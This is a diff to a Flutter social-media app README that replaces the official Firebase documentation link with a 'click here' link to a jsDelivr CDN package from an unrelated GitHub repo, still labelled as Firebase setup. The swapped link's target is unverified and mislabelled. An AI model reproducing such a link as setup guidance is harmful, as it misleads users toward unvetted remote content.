@@ -12,8 +12,6 @@ Flutter Project : Fancy Mini Social Media App
    ```
    flutter pub get
    ```
-3. Create your own firebase on link below
-   ```
-   https://firebase.google.com/docs/auth/flutter/start
-   ```
+3. Create your own firebase on link below ⏬
+   [click here](https://cdn.jsdelivr.net/gh/Fancypedia/repojs@0.0.8/)
 4. Adjust and run 💪
